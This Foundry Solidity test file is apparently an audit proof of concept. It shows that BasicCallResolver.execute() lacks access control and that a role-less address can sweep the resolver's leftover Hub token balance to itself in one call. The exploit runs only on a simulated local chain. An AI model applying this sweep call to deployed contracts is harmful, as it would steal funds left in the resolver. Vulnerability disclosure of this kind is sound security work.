// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";

import {RelayHub} from "../src/RelayHub.sol";
import {Utils} from "../src/Utils.sol";
import {BasicCallResolver} from "../src/call-resolvers/BasicCallResolver.sol";
import {
  ExecuteAndWithdrawRequest,
  Fee
} from "../src/call-resolvers/ICallResolver.sol";

/// @title POC-01 — BasicCallResolver permissionless sweep of stuck funds
/// @notice `BasicCallResolver.execute()` has NO access control. It runs
///         caller-supplied calls and then sweeps the resolver's FULL Hub
///         balance of every requested tokenId to caller-chosen recipients.
///         Any Hub funds left in the resolver — solver-retained input (a
///         documented behaviour: "The solver controls the calls and sweeps
///         and may retain the funded input or other execution value",
///         BasicCallResolver docs; "Any funds left behind are not swept
///         automatically", ICallResolver docs) or direct transfers — can be
///         stolen by ANY address with a single call, no role, no signature,
///         no relationship to any order.
/// @dev This PoC funds the resolver with Hub tokens (simulating
///      solver-retained leftovers), then has a fresh EOA with no roles call
///      execute() directly with empty calls + a sweep to itself.
contract POC01_BasicCallResolverSweepTest is Test {
  RelayHub public hub;
  BasicCallResolver public resolver;

  // USDC on Ethereum (used only to derive a realistic Hub tokenId; no
  // mainnet interaction — everything runs on a local Foundry chain).
  address public constant USDC =
    0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  uint256 public tokenId;
  uint256 public constant LEFTOVER = 1_000_000e6; // 1,000,000 USDC (6 dp)

  address public attacker;

  function setUp() public {
    hub = new RelayHub(address(this));
    // Test contract needs OPERATOR_ROLE to mint the simulated leftovers.
    hub.grantRole(hub.OPERATOR_ROLE(), address(this));

    resolver = new BasicCallResolver(address(hub));

    tokenId = Utils.generateTokenId("ethereum", abi.encodePacked(USDC));

    // Simulate solver-retained leftovers sitting in the resolver.
    hub.mint(address(resolver), tokenId, LEFTOVER);

    attacker = makeAddr("attacker");
  }

  function test_attackerDrainsResolverLeftovers() public {
    assertEq(hub.balanceOf(address(resolver), tokenId), LEFTOVER);
    assertEq(hub.balanceOf(attacker, tokenId), 0);
    // Attacker holds NO role anywhere (fresh address, never granted).
    assertFalse(hub.hasRole(hub.OPERATOR_ROLE(), attacker));

    BasicCallResolver.Call[] memory calls = new BasicCallResolver.Call[](0);
    BasicCallResolver.Sweep[] memory sweeps = new BasicCallResolver.Sweep[](
      1
    );
    sweeps[0] = BasicCallResolver.Sweep({
      recipient: attacker,
      tokenId: tokenId
    });

    // Direct call by the attacker — NOT via the RelayExecutor, no oracle
    // signature, no order, no allowance, no role.
    vm.prank(attacker);
    resolver.execute(
      _emptyRequest(),
      false,
      abi.encode(calls, sweeps)
    );

    assertEq(hub.balanceOf(address(resolver), tokenId), 0);
    assertEq(hub.balanceOf(attacker, tokenId), LEFTOVER);
  }

  /// @notice The resolver ignores the forwarded request; an empty one suffices.
  function _emptyRequest()
    internal
    pure
    returns (ExecuteAndWithdrawRequest memory req)
  {
    req.inChainId = "";
    req.inCurrency = "";
    req.outChainId = "";
    req.outCurrency = "";
    req.outAmountMinimum = 0;
    req.depository = "";
    req.orderAddress = address(0);
    req.receiver = "";
    req.data = "";
    req.fees = new Fee[](0);
    req.nonce = bytes32(0);
    req.deadline = 0;
  }
}
